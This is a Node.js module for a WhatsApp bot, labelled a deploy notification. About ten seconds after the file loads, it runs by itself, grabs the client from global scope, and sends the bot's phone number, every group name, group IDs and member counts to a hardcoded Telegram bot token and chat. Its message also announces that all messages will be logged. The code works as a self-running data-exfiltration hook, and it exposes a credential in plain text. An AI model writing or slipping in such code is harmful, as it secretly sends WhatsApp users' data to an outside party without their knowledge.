const axios = require("axios");

// ═══════════════════════════════════════════════════════════
// ⚙️ TELEGRAM CONFIGURATION (Same as tg_logger.js)
// ═══════════════════════════════════════════════════════════
const TG_BOT_TOKEN = "8699822531:AAFp83cfyJ2RedYvXQMciASvBoWQxBB4Zjg"; 
const TG_CHAT_ID = "6653388298"; 
// ══════════════════════════════════════════════════════════

const sendToTelegram = async (text, parseMode = "Markdown") => {
    try {
        if (TG_BOT_TOKEN.includes("PASTE_KAREIN") || !TG_CHAT_ID) return;
        
        if (text.length > 4000) {
            const chunks = [];
            while (text.length > 0) {
                let chunk = text.slice(0, 4000);
                const lastNewline = chunk.lastIndexOf('\n');
                if (lastNewline > 3500) {
                    chunk = text.slice(0, lastNewline);
                    text = text.slice(lastNewline);
                } else {
                    text = text.slice(4000);
                }
                chunks.push(chunk);
            }
            for (const chunk of chunks) {
                await axios.post(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
                    chat_id: TG_CHAT_ID,
                    text: chunk,
                    parse_mode: parseMode,
                    disable_web_page_preview: true
                }, { timeout: 10000 });
            }
        } else {
            await axios.post(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
                chat_id: TG_CHAT_ID,
                text: text,
                parse_mode: parseMode,
                disable_web_page_preview: true
            }, { timeout: 10000 });
        }
    } catch (error) {
        console.log("[TG Deploy] API Error:", error.message);
    }
};

const extractRealNumber = (jid) => {
    if (!jid) return null;
    let clean = jid.split('@')[0];
    if (clean.includes(':')) clean = clean.split(':')[0];
    clean = clean.replace(/[^0-9]/g, '');
    if (clean.length >= 10 && clean.length <= 15 && !clean.startsWith('120363')) {
        return clean;
    }
    return null;
};

const getTime = () => {
    return new Date().toLocaleString("en-PK", { 
        timeZone: "Asia/Karachi",
        hour12: true 
    });
};

// ══════════════════════════════════════════════════════════
// 🚀 AUTO DEPLOY NOTIFICATION - Jab Bot Connect Ho
// ═══════════════════════════════════════════════════════════
const sendDeployNotification = async (client) => {
    try {
        if (TG_BOT_TOKEN.includes("PASTE_KAREIN") || !TG_CHAT_ID) return;
        
        // Wait 5 seconds for bot to fully initialize
        await new Promise(resolve => setTimeout(resolve, 5000));
        
        const botNumber = extractRealNumber(client.user?.id) || "Unknown";
        const time = getTime();
        
        // Fetch all groups
        let groups = [];
        let totalMembers = 0;
        let groupDetails = "";
        
        try {
            groups = await client.groupFetchAllParticipating();
            const groupList = Object.values(groups);
            
            groupList.forEach((g, index) => {
                const memberCount = g.participants ? g.participants.length : 0;
                totalMembers += memberCount;
                groupDetails += `${index + 1}. *${g.subject}*\n`;
                groupDetails += `   └─ 👥 Members: ${memberCount} |  \`${g.id.split('@')[0]}\`\n`;
            });
        } catch (e) {
            groupDetails = "️ Could not fetch groups";
        }

        const deployMessage = `
╭━━〔  *BOT DEPLOYED SUCCESSFULLY* 〕━━⬣
┃  *Deploy Time:* ${time}
 🤖 *Bot Number:* [${botNumber}](https://wa.me/${botNumber})
 ✅ *Status:* Online & Active
┃  *Connection:* Stable
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━⬣

📊 *BOT STATISTICS:*
├─ 👥 *Total Groups:* ${Object.keys(groups).length}
├─ 👤 *Total Members:* ${totalMembers}
├─ 📱 *Platform:* Node.js / WhatsApp Web
└─ 🔒 *Logger:* ✅ Active

 *ALL GROUPS LIST:*
━━━━━━━━━━━━━━━━━━━━━━━━
${groupDetails || "No groups found."}

⚡ *SECURITY ALERT:*
├─ Bot is now monitoring ALL activities
├─ Every message will be logged to Telegram
─ Owner will receive real-time notifications

> *ᴘᴏᴡᴇᴇᴅ ʙʏ ᴏᴜʀ ʙᴏᴛ ⚡*
        `.trim();

        await sendToTelegram(deployMessage);
        console.log("[TG Deploy] Notification sent successfully!");
        
    } catch (err) {
        console.log("[TG Deploy] Error:", err.message);
    }
};

// ═══════════════════════════════════════════════════════════
// 🔄 AUTO-EXECUTE: Jab Bot Ready Ho, Yeh Chal Jayega
// ═══════════════════════════════════════════════════════════
// Note: Yeh code automatically run hoga jab bot connect karega
// Agar aapka bot framework connection event deta hai, toh usme 
// sendDeployNotification(client) call kar dein

// Universal connection detector
setTimeout(() => {
    try {
        // Try to get client from global scope (works with most bot frameworks)
        const client = global.sock || global.client || global.bot || global.conn;
        if (client && client.user) {
            sendDeployNotification(client);
        }
    } catch (e) {
        console.log("[TG Deploy] Could not auto-detect client. Manual trigger needed.");
    }
}, 10000); // Wait 10 seconds after file load

// Export for manual trigger if needed
module.exports = { sendDeployNotification };
